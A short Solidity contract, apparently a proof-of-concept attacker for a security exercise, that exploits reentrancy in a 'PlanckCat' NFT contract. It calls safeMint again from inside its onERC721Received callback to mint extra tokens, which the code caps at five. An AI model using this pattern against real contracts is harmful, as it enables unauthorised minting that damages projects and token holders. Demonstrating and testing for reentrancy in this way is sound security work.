// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
import "@openzeppelin/contracts/utils/Counters.sol";
import "../interfaces/IPlanckCat.sol";

contract ReenterPlanckCat is ERC721Holder {
    using Counters for Counters.Counter;
    address pcd;
    address deployer;
    Counters.Counter private _tokenIdCounter;

    constructor(address _pcd) {
        deployer = msg.sender;
        pcd = _pcd;
    }

    function reenter() public {
        require(msg.sender == deployer, "!deployer");
        IPlanckCat(pcd).safeMint(address(this));
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public virtual override returns (bytes4) {
        /// Can mint infinite cats on re-entering. So limiting to 5.
        _tokenIdCounter.increment();
        if (_tokenIdCounter.current() == 5) {
            return this.onERC721Received.selector;
        }
        IPlanckCat(pcd).safeMint(address(this));
        return this.onERC721Received.selector;
    }
}
